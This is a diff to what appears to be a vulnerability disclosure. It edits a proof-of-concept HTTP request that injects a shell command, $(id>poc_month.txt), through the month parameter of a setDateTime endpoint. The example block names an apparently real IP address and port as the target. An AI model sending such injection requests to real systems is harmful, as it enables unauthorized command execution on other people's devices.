@@ -9,14 +9,14 @@ The  parameter **$month** in `setDataTime` function in the file `\usr\www\applic
 ### POC
 
 ```
-POST /settings/setDateTime/2008/1/1$(id>poc.txt)/1/1 HTTP/1.1
+POST /settings/setDateTime/2000/12$(id>poc_month.txt)/12/12/12 HTTP/1.1
 Host: XXXXXXX
 ```
 
 ### Example 
 
 ```
-POST /settings/setDateTime/2008/1/1$(id>poc.txt)/1/1 HTTP/1.1
+POST /settings/setDateTime/2000/12$(id>poc_month.txt)/12/12/12 HTTP/1.1
 Host: 222.103.211.89:8004
 ```
 
